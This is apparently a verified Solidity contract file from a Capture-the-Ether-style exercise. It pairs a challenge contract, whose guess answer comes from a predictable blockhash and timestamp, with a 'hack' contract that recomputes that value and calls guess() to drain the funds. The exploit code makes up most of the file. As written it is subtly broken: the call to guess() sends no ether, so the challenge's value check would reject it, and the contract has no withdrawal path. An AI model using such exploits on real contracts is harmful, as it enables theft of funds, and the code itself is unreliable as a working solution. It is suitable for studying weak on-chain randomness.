/**
 *Submitted for verification at polygonscan.com on 2023-05-02
*/

pragma solidity ^0.8.18;

contract GuessTheNewNumberChallenge {
    function Challenge() public payable {
        require(msg.value == 10000);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 10000 );
        uint8 answer =uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1),block.timestamp))));

        if (n == answer) {
            msg.sender.call{value:20000}("");
        }
    }
}

//攻击合约和被攻击合约的区块是一个区块
contract hack{
GuessTheNewNumberChallenge gc;

constructor(address add) {

gc=GuessTheNewNumberChallenge(add);

}

fallback()external payable {
    uint8 answer =uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1),block.timestamp))));
address(gc).call(abi.encodeWithSignature("guess(uint8)", answer));
}

}